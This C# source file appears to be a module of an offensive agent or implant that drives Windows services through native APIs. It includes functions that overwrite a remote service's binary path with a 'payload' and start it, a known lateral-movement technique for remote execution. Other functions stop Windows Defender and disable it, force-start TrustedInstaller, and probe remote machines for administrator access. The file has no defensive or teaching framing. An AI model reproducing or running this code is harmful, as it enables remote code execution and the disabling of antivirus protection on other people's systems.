using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.ComponentModel;
using System.ServiceProcess;

namespace Agent.Internal
{
    public static class Services
    {
        public static bool EditLocalServiceStartType(string serviceName, uint startType)
        {
            var scManagerHandle = Native.Advapi.OpenSCManager(null, null, Native.Advapi.SC_MANAGER_ALL_ACCESS);
            if (scManagerHandle == IntPtr.Zero)
            {
                Console.WriteLine("Open Service Manager Error");
                return false;
            }

            var serviceHandle = Native.Advapi.OpenService(scManagerHandle, serviceName, Native.Advapi.SERVICE_ALL_ACCESS);

            if (serviceHandle == IntPtr.Zero)
            {
                Console.WriteLine("Open Service Error");
                int nError = Marshal.GetLastWin32Error();
                var win32Exception = new Win32Exception(nError);
                Console.WriteLine("Could not change service start type: " + win32Exception.Message);
                return false;
            }
            var result = Native.Advapi.ChangeServiceConfig(serviceHandle, Native.Advapi.SERVICE_NO_CHANGE, startType, Native.Advapi.SERVICE_NO_CHANGE, null, null, IntPtr.Zero, null, null, null, null);
            if (result == false)
            {
                int nError = Marshal.GetLastWin32Error();
                var win32Exception = new Win32Exception(nError);
                Console.WriteLine("Could not change service start type: " + win32Exception.Message);
                return false;
            }
            Native.Advapi.CloseServiceHandle(serviceHandle);
            Native.Advapi.CloseServiceHandle(scManagerHandle);
            return true;
        }

        public static bool EditRemoteServiceBinary(string target, string serviceName, string payload)
        {
            var scManagerHandle = Native.Advapi.OpenSCManager(target, null, Native.Advapi.SC_MANAGER_ALL_ACCESS);
            if (scManagerHandle == IntPtr.Zero)
            {
                Console.WriteLine("Open Service Manager Error");
                return false;
            }

            var serviceHandle = Native.Advapi.OpenService(scManagerHandle, serviceName, Native.Advapi.SERVICE_ALL_ACCESS);

            if (serviceHandle == IntPtr.Zero)
            {
                Console.WriteLine("Open Service Error");
                return false;
            }
            var result = Native.Advapi.ChangeServiceConfig(serviceHandle, Native.Advapi.SERVICE_NO_CHANGE, 3, Native.Advapi.SERVICE_ERROR_IGNORE, payload, null, IntPtr.Zero, null, null, null, null);
            if (result == false)
            {
                int nError = Marshal.GetLastWin32Error();
                var win32Exception = new Win32Exception(nError);
                Console.WriteLine("Could not change service binary: " + win32Exception.Message);
                return false;
            }
            Native.Advapi.CloseServiceHandle(serviceHandle);
            Native.Advapi.CloseServiceHandle(scManagerHandle);
            return true;
        }

        public static bool StartRemoteService(string target, string serviceName)
        {
            var scManagerHandle = Native.Advapi.OpenSCManager(target, null, Native.Advapi.SC_MANAGER_ALL_ACCESS);
            if (scManagerHandle == IntPtr.Zero)
            {
                Console.WriteLine("Open Service Manager Error");
                return false;
            }

            var serviceHandle = Native.Advapi.OpenService(scManagerHandle, serviceName, Native.Advapi.SERVICE_ALL_ACCESS); // all accesss

            if (serviceHandle == IntPtr.Zero)
            {
                Console.WriteLine("Open Service Error");
                return false;
            }
            var res = Native.Advapi.StartService(serviceHandle, 0, null);
            Native.Advapi.CloseServiceHandle(serviceHandle);
            Native.Advapi.CloseServiceHandle(scManagerHandle);
            return res;
        }
        public static bool StopRemoteService(string target, string serviceName)
        {
            var scManagerHandle = Native.Advapi.OpenSCManager(target, null, Native.Advapi.SC_MANAGER_ALL_ACCESS);
            if (scManagerHandle == IntPtr.Zero)
            {
                Console.WriteLine("Open Service Manager Error");
                return false;
            }

            var serviceHandle = Native.Advapi.OpenService(scManagerHandle, serviceName, Native.Advapi.SERVICE_ALL_ACCESS); // all accesss
            if (serviceHandle == IntPtr.Zero)
            {
                Console.WriteLine("Open Service Error");
                return false;
            }
            Native.Advapi.SERVICE_STATUS status = new Native.Advapi.SERVICE_STATUS();
            var res = Native.Advapi.ControlService(serviceHandle, Native.Advapi.SERVICE_CONTROL.STOP, ref status);
            if (!res)
            {
                Native.Advapi.CloseServiceHandle(serviceHandle);
                Native.Advapi.CloseServiceHandle(scManagerHandle);
                return res;

            }
            Native.Advapi.CloseServiceHandle(serviceHandle);
            Native.Advapi.CloseServiceHandle(scManagerHandle);
            return res;
        }
        public static int StartService(string serviceName)
        {
            ServiceController[] scServices;
            scServices = ServiceController.GetServices();
            foreach (ServiceController service in scServices)
            {
                if (service.ServiceName == serviceName)
                {
                    Console.WriteLine("Attempting to start {0}", serviceName);
                    if (service.Status != ServiceControllerStatus.Running)
                    {
                        service.Start();
                        service.WaitForStatus(ServiceControllerStatus.Running);
                        Console.WriteLine("{0} started", serviceName);
                        return 0;
                    }
                    else
                    {
                        Console.WriteLine("{0} already running...Exiting..", serviceName);
                        return 0;
                    }

                }
            }
            Console.WriteLine("{0} not found", serviceName);
            return 1;
        }
        public static void ChangeStartMode(ServiceController svc, ServiceStartMode mode)
        {
            var scManagerHandle = Native.Advapi.OpenSCManager(null, null, Native.Advapi.SC_MANAGER_ALL_ACCESS);
            if (scManagerHandle == IntPtr.Zero)
            {
                throw new ExternalException("Open Service Manager Error");
            }

            var serviceHandle = Native.Advapi.OpenService(
                scManagerHandle,
                svc.ServiceName,
                Native.Advapi.SERVICE_QUERY_CONFIG | Native.Advapi.SERVICE_CHANGE_CONFIG);

            if (serviceHandle == IntPtr.Zero)
            {
                throw new ExternalException("Open Service Error");
            }

            var result = Native.Advapi.ChangeServiceConfig(
                serviceHandle,
                Native.Advapi.SERVICE_NO_CHANGE,
                (uint)mode,
                Native.Advapi.SERVICE_NO_CHANGE,
                null,
                null,
                IntPtr.Zero,
                null,
                null,
                null,
                null);

            if (result == false)
            {
                int nError = Marshal.GetLastWin32Error();
                var win32Exception = new Win32Exception(nError);
                throw new ExternalException("Could not change service start type: "
                    + win32Exception.Message);
            }

            Native.Advapi.CloseServiceHandle(serviceHandle);
            Native.Advapi.CloseServiceHandle(scManagerHandle);
        }

        public enum SimpleServiceCustomCommands
        { StopWorker = 128, RestartWorker, CheckWorker };
        public static int StopWinDefend()
        {
            ServiceController[] scServices;
            scServices = ServiceController.GetServices();
            foreach (ServiceController service in scServices)
            {
                if (service.ServiceName == "WinDefend")
                {
                    if (service.Status != ServiceControllerStatus.Running)
                    {
                        Console.WriteLine("Defender already disabled...exiting");
                        return 0;
                    }
                    service.Stop();
                    service.WaitForStatus(ServiceControllerStatus.Stopped);
                    Console.WriteLine("windefend stoppped");
                    ChangeStartMode(service, ServiceStartMode.Disabled);
                    return 0;
                }
            }
            Console.WriteLine("windefend not found or stoppped");
            return 1;
        }

        public static int StartWinDefend()
        {
            ServiceController[] scServices;
            scServices = ServiceController.GetServices();
            foreach (ServiceController service in scServices)
            {
                if (service.ServiceName == "WinDefend")
                {
                    if (service.Status != ServiceControllerStatus.Running)
                    {
                        Console.WriteLine("Attempting to set start type to auto winDefend");
                        ChangeStartMode(service, ServiceStartMode.Automatic);
                        Console.WriteLine("Attempting to start winDefend");
                        service.Start();
                        service.WaitForStatus(ServiceControllerStatus.StartPending);
                        return 0;
                    }
                    Console.WriteLine("WinDefend already running nothing to do");
                    return 0;
                }
            }
            Console.WriteLine("windefend not found or stoppped");
            return 1;
        }
        public static int StartTrustedInstaller()
        {
            ServiceController[] scServices;
            scServices = ServiceController.GetServices();
            foreach (ServiceController service in scServices)
            {
                if (service.ServiceName == "TrustedInstaller")
                {
                    //Check if trusted installer is disabled!
                    // if disabled set start type to demand
                    Console.WriteLine("Checking if trusted installer is enabled");
                    if (service.StartType == ServiceStartMode.Disabled)
                    {
                        Console.WriteLine("Trusted installer is disabled Attempting to set it to demand start");
                        ChangeStartMode(service, ServiceStartMode.Manual);
                        //if (!EditLocalServiceStartType("trustedinstaller", 3))
                        //{
                        //    Console.WriteLine("Failed to set it to demand start");
                        //    return 1;
                        //}
                        Console.WriteLine("Successfully set trusted installer to demand start");
                    }
                    Console.WriteLine("Attempting to start trusted installer");
                    if (service.Status != ServiceControllerStatus.Running)
                    {
                        service.Start();
                        service.WaitForStatus(ServiceControllerStatus.Running);
                        Console.WriteLine("Trusted installer started");
                        return 0;
                    }
                    else
                    {
                        Console.WriteLine("Trusted installer already running");
                        return 0;
                    }

                }
            }
            Console.WriteLine("trusted installer not found");
            return 1;
        }

        public static int StopService(string serviceName)
        {
            ServiceController[] scServices;
            scServices = ServiceController.GetServices();
            foreach (ServiceController service in scServices)
            {
                if (service.ServiceName == serviceName)
                {
                    if (service.Status != ServiceControllerStatus.Running)
                    {
                        Console.WriteLine("{0} already stopped...exiting", serviceName);
                        return 0;
                    }
                    service.Stop();
                    service.WaitForStatus(ServiceControllerStatus.Stopped);
                    Console.WriteLine("{} stoppped", serviceName);
                    return 0;
                }
            }
            Console.WriteLine("{0} not found or stoppped", serviceName);
            return 1;
        }

        public static bool CheckIfAdminAccess(string target)
        {
            if (Native.Advapi.OpenSCManager(target, null, Native.Advapi.SC_MANAGER_ALL_ACCESS) == IntPtr.Zero)
                return false;
            return true;
        }

        public static bool QueryRemoteServiceBinaryPath(string target, string serviceName, ref string binaryPath)
        {
            var scManagerHandle = Native.Advapi.OpenSCManager(target, null, Native.Advapi.SC_MANAGER_ALL_ACCESS);
            if (scManagerHandle == IntPtr.Zero)
            {
                Console.WriteLine("Open Service Manager Error");
                return false;
            }

            var serviceHandle = Native.Advapi.OpenService(scManagerHandle, serviceName, Native.Advapi.SERVICE_ALL_ACCESS);

            if (serviceHandle == IntPtr.Zero)
            {
                Console.WriteLine("Open Service Error");
                return false;
            }
            uint structSz;
            Native.Advapi.QueryServiceConfig(serviceHandle, IntPtr.Zero, 0, out structSz);
            // create buffer to hold config
            IntPtr ptr = Marshal.AllocHGlobal((int)structSz);
            var success = Native.Advapi.QueryServiceConfig(serviceHandle, ptr, structSz, out structSz);
            if (!success)
            {
                Console.WriteLine("Failed second service query");
                Marshal.FreeHGlobal(ptr);
                return false;
            }
            Native.Advapi.QueryServiceConfigStruct configStruct = (Native.Advapi.QueryServiceConfigStruct)Marshal.PtrToStructure(ptr, typeof(Native.Advapi.QueryServiceConfigStruct));
            string path = Marshal.PtrToStringAuto(configStruct.binaryPathName);
            Marshal.FreeHGlobal(ptr);
            binaryPath = path;
            Native.Advapi.CloseServiceHandle(serviceHandle);
            Native.Advapi.CloseServiceHandle(scManagerHandle);
            return true;
        }
    }
}
